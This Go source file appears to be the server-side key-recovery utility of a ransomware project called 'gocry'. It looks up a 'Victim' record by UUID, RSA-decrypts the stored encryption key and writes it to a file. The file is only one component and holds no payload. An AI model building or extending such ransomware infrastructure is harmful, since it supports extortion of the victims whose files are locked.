package main

import (
	"io/ioutil"
	"log"
	"os"

	"github.com/nireo/gocry/server/database"
	"github.com/nireo/gocry/server/utils"
)

func main() {
	if len(os.Args) < 2 {
		log.Fatalf("you need to provide user's id")
	}

	database.ConnectToDatbase()
	db := database.GetDatabase()

	var victim database.Victim
	if err := db.Where(&database.Victim{UUID: os.Args[1]}).Find(&victim).Error; err != nil {
		log.Fatal(err)
	}

	out, err := utils.DecryptRSA(os.Args[1], victim.EncryptionKey)
	if err != nil {
		log.Fatal(err)
	}

	if err := ioutil.WriteFile("./key.txt", out, 0666); err != nil {
		log.Fatalf("error writing key data, err: %s", err)
	}
}
